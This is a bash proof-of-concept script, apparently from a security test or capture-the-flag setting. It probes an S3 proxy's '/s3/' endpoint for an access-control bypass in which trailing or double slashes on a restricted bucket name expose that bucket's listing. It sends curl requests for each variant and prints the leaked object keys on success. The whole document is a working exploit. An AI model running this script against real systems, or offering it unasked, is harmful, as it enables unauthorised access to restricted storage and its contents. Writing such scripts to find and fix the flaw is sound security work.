#!/bin/bash

# POC: Path Traversal / Directory Traversal - Hidden Bucket Access via Trailing Slash
# Target: S3 proxy endpoint at /s3/
# Description: Demonstrates inconsistent path normalization in S3 proxy that allows access to restricted buckets

TARGET_URL="${1:-http://localhost:3000}"
RESTRICTED_BUCKET="${2:-gold}"
ACCESSIBLE_BUCKET="${3:-assets}"

echo "================================================"
echo "Path Traversal via Trailing Slash - S3 Proxy POC"
echo "================================================"
echo "Target: ${TARGET_URL}"
echo "Testing bucket access patterns and normalization"
echo ""

# Test 1: Restricted bucket without trailing slash
echo "[Test 1] RESTRICTED bucket WITHOUT trailing slash: /s3/${RESTRICTED_BUCKET}"
RESPONSE_1=$(curl -s -w "\n%{http_code}" "${TARGET_URL}/s3/${RESTRICTED_BUCKET}")
HTTP_1=$(echo "$RESPONSE_1" | tail -n1)
BODY_1=$(echo "$RESPONSE_1" | head -n-1)
echo "HTTP Status: ${HTTP_1}"
if echo "$BODY_1" | grep -q "ListBucketResult"; then
    echo "✓ Bucket listing accessible"
    echo "$BODY_1" | grep -o "<Key>[^<]*</Key>" | head -3
elif echo "$BODY_1" | grep -q "NoSuchBucket"; then
    echo "✗ Access denied (NoSuchBucket)"
fi
echo ""

# Test 2: Restricted bucket with trailing slash
echo "[Test 2] RESTRICTED bucket WITH trailing slash: /s3/${RESTRICTED_BUCKET}/"
RESPONSE_2=$(curl -s -w "\n%{http_code}" "${TARGET_URL}/s3/${RESTRICTED_BUCKET}/")
HTTP_2=$(echo "$RESPONSE_2" | tail -n1)
BODY_2=$(echo "$RESPONSE_2" | head -n-1)
echo "HTTP Status: ${HTTP_2}"
if echo "$BODY_2" | grep -q "ListBucketResult"; then
    echo "✓ Bucket listing accessible"
    echo "$BODY_2" | grep -o "<Key>[^<]*</Key>" | head -3
elif echo "$BODY_2" | grep -q "NoSuchBucket"; then
    echo "✗ Access denied (NoSuchBucket)"
fi
echo ""

# Test 3: Accessible bucket without trailing slash
echo "[Test 3] ACCESSIBLE bucket WITHOUT trailing slash: /s3/${ACCESSIBLE_BUCKET}"
RESPONSE_3=$(curl -s -w "\n%{http_code}" "${TARGET_URL}/s3/${ACCESSIBLE_BUCKET}")
HTTP_3=$(echo "$RESPONSE_3" | tail -n1)
BODY_3=$(echo "$RESPONSE_3" | head -n-1)
echo "HTTP Status: ${HTTP_3}"
if echo "$BODY_3" | grep -q "ListBucketResult"; then
    echo "✓ Bucket listing accessible"
    echo "$BODY_3" | grep -o "<Key>[^<]*</Key>" | head -3
elif echo "$BODY_3" | grep -q "NoSuchBucket"; then
    echo "✗ Access denied (NoSuchBucket)"
fi
echo ""

# Test 4: Accessible bucket with trailing slash
echo "[Test 4] ACCESSIBLE bucket WITH trailing slash: /s3/${ACCESSIBLE_BUCKET}/"
RESPONSE_4=$(curl -s -w "\n%{http_code}" "${TARGET_URL}/s3/${ACCESSIBLE_BUCKET}/")
HTTP_4=$(echo "$RESPONSE_4" | tail -n1)
BODY_4=$(echo "$RESPONSE_4" | head -n-1)
echo "HTTP Status: ${HTTP_4}"
if echo "$BODY_4" | grep -q "ListBucketResult"; then
    echo "✓ Bucket listing accessible"
    echo "$BODY_4" | grep -o "<Key>[^<]*</Key>" | head -3
elif echo "$BODY_4" | grep -q "NoSuchBucket"; then
    echo "✗ Access denied (NoSuchBucket)"
fi
echo ""

# Test 5: Double trailing slash
echo "[Test 5] RESTRICTED bucket with DOUBLE trailing slash: /s3/${RESTRICTED_BUCKET}//"
RESPONSE_5=$(curl -s -w "\n%{http_code}" "${TARGET_URL}/s3/${RESTRICTED_BUCKET}//")
HTTP_5=$(echo "$RESPONSE_5" | tail -n1)
BODY_5=$(echo "$RESPONSE_5" | head -n-1)
echo "HTTP Status: ${HTTP_5}"
if echo "$BODY_5" | grep -q "ListBucketResult"; then
    echo "✓ Bucket listing accessible"
elif echo "$BODY_5" | grep -q "NoSuchBucket"; then
    echo "✗ Access denied (NoSuchBucket)"
fi
echo ""

# Analysis
echo "================================================"
echo "ANALYSIS:"
echo "================================================"

# Check if restricted bucket is accessible
if [ "$HTTP_1" = "200" ] || [ "$HTTP_2" = "200" ] || [ "$HTTP_5" = "200" ]; then
    if echo "$BODY_1$BODY_2$BODY_5" | grep -q "<Key>"; then
        echo "✓ VULNERABILITY CONFIRMED"
        echo "  Restricted bucket '$RESTRICTED_BUCKET' is accessible"
        echo "  Path normalization is inconsistent across different slash variations"
        echo "  This allows bypassing intended access controls"
        echo ""
        echo "  Successful access patterns:"
        [ "$HTTP_1" = "200" ] && echo "    - Without trailing slash (HTTP 200)"
        [ "$HTTP_2" = "200" ] && echo "    - With single trailing slash (HTTP 200)"
        [ "$HTTP_5" = "200" ] && echo "    - With double trailing slash (HTTP 200)"
        exit 0
    fi
fi

echo "✗ Could not confirm vulnerability - restricted bucket appears blocked"
exit 1